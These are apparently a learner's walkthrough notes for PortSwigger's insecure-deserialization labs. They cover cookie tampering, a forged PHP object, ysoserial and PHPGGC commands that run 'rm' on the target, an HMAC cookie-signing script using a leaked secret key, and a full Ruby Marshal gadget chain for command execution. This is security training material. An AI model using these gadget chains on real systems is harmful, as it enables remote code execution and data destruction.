
## [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

- Verify that the application is using deserialization.
	- Look for base64 values sent in the cookie and decode
- Change the admin boolean attribute from false to true (change the 0 to a 1)


## [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

- Verify that the application is using deserialization.
	- Look for base64 values sent in the cookie and decode
- Change to access token to an integer value set to 0. (This should bypass the token auth)
- Change the username to administrator.

## [Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

- Look for delete account function.
- Verify that the delete account function is using deserialization.
	- Look for base64 values sent in the cookie and decode
- Notice the serialized object has an `avatar_link` attribute, which contains the file path to your avatar.
- Edit the path to be `/home/carlos/morale.txt`
- Edit the username to be `carlos`
- Send the request. 
- In the response there should be an access token. Use this in the cookie and send the request again.

## [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

- Verify that the application is using deserialization.
	- Look for base64 values sent in the cookie and decode
- Look for request to a php file in the site map and send it to the repeater. (It should look something like /libs/CustomTemplate.php)
- Append a ~ to the end of the url/filename to access the source code.
- Read the code and look for magic methods that will invoke another method with sensitive functionality. (If you dont know PHP that have AI read it)
- Create object that will invoke the lock_file_path method and delete the file /home/carlos/morale.txt
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
- Base64 encode then url encode any = signs and add to the cookie header.

## [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

- Verify that the application is using deserialization.
	- Look for base64 values sent in the cookie and decode
- Run the following command to create a serialized method with ysoserial:
```bash
java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```
- **Note:** The command in portswigger will add crlf to payload so you need to add -w 0 to the base64 command.


## [Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)


- Verify that the application is using deserialization.
	- Look for base64 values sent in the cookie and decode
- Try to modify the cookie and notice it is not accepted because the signature does not match. 
- Look for a comment that reveals a debug page. (It should look like **/cgi/php.info**)
- The debug page should show the SECRET_KEY environment variables.
- Download PHPGGC and run the following command:
```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```
- Construct a cookie with the malicious object and sign it with the secret key by running the following php script in an online php interpreter:
```php
<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
```
- Add the output to the cookie and send request.



## [Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)

- Verify that the application is using deserialization.
	- Look for base64 values sent in the cookie and decode
	- **Note:** Base64 values dont always have a == at the end. Always check for base64 decoding in session cookies.
- Create a file called exploit.rb on your computer and paste the following code:
```ruby
require 'base64'
require 'net/protocol'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# Prevent the payload from running locally when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

command = 'rm /home/carlos/morale.txt'

# Fix for Ruby 3.2+: Use allocate to bypass the initialize argument error
wa1 = Net::WriteAdapter.allocate
wa1.instance_variable_set('@socket', Kernel)
wa1.instance_variable_set('@method_id', :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', command)

# Fix for Ruby 3.2+ here as well
wa2 = Net::WriteAdapter.allocate
wa2.instance_variable_set('@socket', rs)
wa2.instance_variable_set('@method_id', :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

# Use strict_encode64 to remove CRLF/newlines
puts Base64.strict_encode64(payload)
```
- Run the ruby script with
```bash
ruby exploit.rb
```

- Paste the base64 output into the session value in the cookie.
- Remove the CRLF and URL encode the value.

